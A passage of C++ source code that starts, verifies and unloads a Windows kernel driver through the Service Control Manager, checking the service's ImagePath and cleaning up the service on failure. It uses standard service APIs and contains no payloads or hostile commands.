    {
        wchar_t buf[768];
        swprintf_s(buf,
            L"[-] SCM: refusing StartService. Bound ImagePath=\"%ls\" is not the requested \"%ls\".",
            boundPath.c_str(), requestedCanon.c_str());
        printf("%ls\n", buf);
        fflush(stdout);
        SetOptionalWideError(errorOut, buf);
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
        return false;
    }

    printf("[*] SCM: StartService %ls ImagePath=\"%ls\"\n", serviceName, boundPath.c_str());
    fflush(stdout);

    BOOL started = StartServiceW(svc, 0, nullptr);
    DWORD startErr = started ? 0 : GetLastError();
    if (!started && startErr == ERROR_SERVICE_ALREADY_RUNNING)
    {
        std::wstring runningPath;
        QueryServiceImagePath(svc, &runningPath);
        if (!PathsEqualCanonical(CanonicalizeSysPath(runningPath.c_str()), requestedCanon))
        {
            wchar_t buf[768];
            swprintf_s(buf,
                L"[-] SCM: service already running with leftover ImagePath=\"%ls\" "
                L"(requested \"%ls\"). Refusing to treat ALREADY_RUNNING as success.",
                runningPath.c_str(), requestedCanon.c_str());
            printf("%ls\n", buf);
            fflush(stdout);
            SetOptionalWideError(errorOut, buf);
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return false;
        }
        started = TRUE;
        startErr = 0;
    }

    SERVICE_STATUS_PROCESS ssp{};
    DWORD needed = 0;
    QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO,
                         reinterpret_cast<LPBYTE>(&ssp), sizeof(ssp), &needed);

    bool running = false;
    if (started)
        running = WaitForServiceState(svc, SERVICE_RUNNING, 10000, &ssp);
    else
        QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO,
                             reinterpret_cast<LPBYTE>(&ssp), sizeof(ssp), &needed);

    if (!running || ssp.dwCurrentState != SERVICE_RUNNING)
    {
        wchar_t buf[768];
        FormatScmLoadError(startErr, ssp, buf, _countof(buf));
        printf("%ls\n", buf);
        fflush(stdout);
        SetOptionalWideError(errorOut, buf);

        SERVICE_STATUS st{};
        ControlService(svc, SERVICE_CONTROL_STOP, &st);
        DeleteService(svc);
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
        return false;
    }

    std::wstring usedPath;
    QueryServiceImagePath(svc, &usedPath);
    printf("[+] SCM: service %ls is RUNNING ImagePath=\"%ls\"\n",
           serviceName, usedPath.empty() ? requestedCanon.c_str() : usedPath.c_str());
    fflush(stdout);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return true;
}

bool UnloadDriverViaService(const wchar_t* serviceName, std::wstring* errorOut)
{
    if (!serviceName)
        return false;

    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm)
    {
        const DWORD err = GetLastError();
        wchar_t buf[256];
        swprintf_s(buf, L"[-] SCM unload: OpenSCManager failed Win32=%lu", err);
        printf("%ls\n", buf);
        fflush(stdout);
        SetOptionalWideError(errorOut, buf);
        return false;
    }

    SC_HANDLE svc = OpenServiceW(scm, serviceName, SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
    if (!svc)
    {
        const DWORD err = GetLastError();
        CloseServiceHandle(scm);
        wchar_t buf[256];
        swprintf_s(buf, L"[-] SCM unload: service '%ls' not found (Win32=%lu).", serviceName, err);
        printf("%ls\n", buf);
        fflush(stdout);
        SetOptionalWideError(errorOut, buf);
        return false;
    }

    printf("[*] SCM: stopping %ls\n", serviceName);
    fflush(stdout);
    SERVICE_STATUS st{};
    ControlService(svc, SERVICE_CONTROL_STOP, &st);
    SERVICE_STATUS_PROCESS ssp{};
    WaitForServiceState(svc, SERVICE_STOPPED, 5000, &ssp);

    const BOOL deleted = DeleteService(svc);
    const DWORD delErr = deleted ? 0 : GetLastError();
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    if (!deleted && delErr != ERROR_SERVICE_MARKED_FOR_DELETE)
    {
        wchar_t buf[256];
        swprintf_s(buf, L"[-] SCM unload: DeleteService failed Win32=%lu", delErr);
        printf("%ls\n", buf);
        fflush(stdout);
        SetOptionalWideError(errorOut, buf);
        return false;
    }

    printf("[+] SCM: service %ls stopped and deleted\n", serviceName);
    fflush(stdout);
    return true;
}
